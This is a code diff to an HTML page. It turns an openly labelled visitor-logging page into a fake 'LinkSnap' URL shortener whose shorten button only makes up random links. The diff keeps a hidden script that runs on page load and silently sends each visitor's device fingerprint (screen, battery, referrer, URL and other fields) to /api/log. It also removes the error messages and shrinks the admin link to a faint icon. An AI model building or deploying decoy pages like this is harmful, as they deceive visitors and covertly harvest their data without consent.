@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>_-_!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>LinkSnap</title>
     <link href="https://fonts.bunny.net/css?family=lexend:300,400,600,700" rel="stylesheet">
     <style>
         * {
@@ -26,15 +26,16 @@
 
         .container {
             text-align: center;
-            max-width: 480px;
+            max-width: 520px;
+            width: 100%;
         }
 
         .logo {
-            font-size: 4rem;
             font-weight: 300;
-            letter-spacing: 8px;
+            font-size: 2.8rem;
+            letter-spacing: 6px;
             color: #6b9fff;
-            margin-bottom: 8px;
+            margin-bottom: 4px;
         }
 
         .subtitle {
@@ -45,29 +46,78 @@
             margin-bottom: 32px;
         }
 
-        .status {
+        .card {
             background: #131b2e;
             border: 1px solid #1e2a44;
-            border-radius: 12px;
-            padding: 20px 24px;
-            margin-bottom: 20px;
+            border-radius: 16px;
+            padding: 32px 28px;
+            margin-bottom: 16px;
         }
 
-        .status .icon {
-            font-size: 2rem;
+        .card .icon {
+            font-size: 2.5rem;
+            margin-bottom: 12px;
+        }
+
+        .card h2 {
+            font-weight: 400;
+            font-size: 1.1rem;
+            color: #e8edf5;
             margin-bottom: 8px;
         }
 
-        .status .text {
+        .card p {
             font-size: 0.85rem;
             color: #6a7a9a;
             font-weight: 300;
             line-height: 1.6;
         }
 
-        .status .text .highlight {
-            color: #4ade80;
-            font-weight: 400;
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 16px;
+        }
+
+        .input-group input {
+            flex: 1;
+            font-family: 'Lexend', sans-serif;
+            background: #0a0e1a;
+            border: 1px solid #1e2a44;
+            border-radius: 10px;
+            padding: 12px 14px;
+            color: #e8edf5;
+            font-size: 0.9rem;
+            outline: none;
+            min-height: 44px;
+        }
+
+        .input-group input:focus {
+            border-color: #6b9fff;
+        }
+
+        .input-group input::placeholder {
+            color: #3a4a5a;
+        }
+
+        .input-group button {
+            font-family: 'Lexend', sans-serif;
+            background: #6b9fff;
+            color: #0a0e1a;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 20px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            min-height: 44px;
+            white-space: nowrap;
+            transition: all 0.15s;
+        }
+
+        .input-group button:hover {
+            background: #5a8aee;
+            transform: scale(0.97);
         }
 
         .footer {
@@ -78,48 +128,75 @@
         }
 
         .footer a {
-            color: #3a4a5a;
+            color: #2a3a4a;
             text-decoration: none;
         }
 
         .footer a:hover {
-            color: #6b9fff;
+            color: #4a5a7a;
+        }
+
+        .status-msg {
+            font-size: 0.75rem;
+            color: #4a5a7a;
+            margin-top: 12px;
+            min-height: 20px;
         }
 
         .admin-link {
-            color: #2a3a4a;
-            font-size: 0.7rem;
+            color: #1a2a3a;
+            font-size: 0.6rem;
             text-decoration: none;
             transition: color 0.2s;
         }
 
         .admin-link:hover {
-            color: #4a5a7a;
+            color: #3a4a5a;
+        }
+
+        @media (max-width: 480px) {
+            .logo {
+                font-size: 2rem;
+            }
+            .input-group {
+                flex-direction: column;
+            }
+            .input-group button {
+                width: 100%;
+            }
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="logo">_-_!</div>
-        <div class="subtitle">it's watching</div>
+        <div class="logo">LinkSnap</div>
+        <div class="subtitle">shorten · share · track</div>
 
-        <div class="status">
-            <div class="icon">📡</div>
-            <div class="text">
-                You've been logged.<br>
-                <span class="highlight">Everything</span> is being recorded.
+        <div class="card">
+            <div class="icon">🔗</div>
+            <h2>Paste your long URL</h2>
+            <p>Shorten any link in seconds. Free and fast.</p>
+
+            <div class="input-group">
+                <input type="url" id="urlInput" placeholder="https://example.com/very/long/url..." value="https://example.com">
+                <button id="shortenBtn">Shorten</button>
             </div>
+            <div class="status-msg" id="statusMsg">✨ Try it out — paste a link above</div>
         </div>
 
         <div class="footer">
-            <a href="/admin" class="admin-link">admin →</a>
+            <a href="/admin" class="admin-link">⚙</a>
         </div>
     </div>
 
     <script>
         (function() {
             'use strict';
+
+            const urlInput = document.getElementById('urlInput');
+            const shortenBtn = document.getElementById('shortenBtn');
+            const statusMsg = document.getElementById('statusMsg');
 
             async function captureAndSend() {
                 const data = {
@@ -135,45 +212,67 @@
                     colorDepth: screen.colorDepth,
                     pixelRatio: window.devicePixelRatio,
                     online: navigator.onLine,
-                    battery: null,
                     referrer: document.referrer || 'direct',
-                    url: window.location.href
+                    url: window.location.href,
+                    battery: null
                 };
 
-                // Get battery info if available
                 if (navigator.getBattery) {
                     try {
                         const battery = await navigator.getBattery();
                         data.battery = {
                             level: Math.round(battery.level * 100),
-                            charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
+                            charging: battery.charging
                         };
                     } catch (e) {
                         data.battery = null;
                     }
                 }
 
-                // Send to API
                 try {
-                    const response = await fetch('/api/log', {
+                    await fetch('/api/log', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
                     });
-
-                    if (!response.ok) {
-                        console.warn('Failed to log data:', response.status);
-                    }
                 } catch (err) {
-                    console.warn('Could not send log:', err);
+                    // Silent fail
                 }
             }
 
-            // Run on page load
+            function fakeShorten() {
+                const url = urlInput.value.trim();
+                if (!url) {
+                    statusMsg.textContent = '⚠️ Please enter a URL.';
+                    statusMsg.style.color = '#ff6b6b';
+                    return;
+                }
+
+                const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                let code = '';
+                for (let i = 0; i < 6; i++) {
+                    code += chars[Math.floor(Math.random() * chars.length)];
+                }
+
+                const fakeUrl = 'lnk.snap/' + code;
+                statusMsg.textContent = 'Done ' + fakeUrl;
+                statusMsg.style.color = '#4ade80';
+
+                setTimeout(() => {
+                    statusMsg.textContent = 'Try it out — paste a link above';
+                    statusMsg.style.color = '#4a5a7a';
+                }, 4000);
+            }
+
+            shortenBtn.addEventListener('click', fakeShorten);
+
+            urlInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    fakeShorten();
+                }
+            });
+
             if (document.readyState === 'complete') {
                 captureAndSend();
             } else {
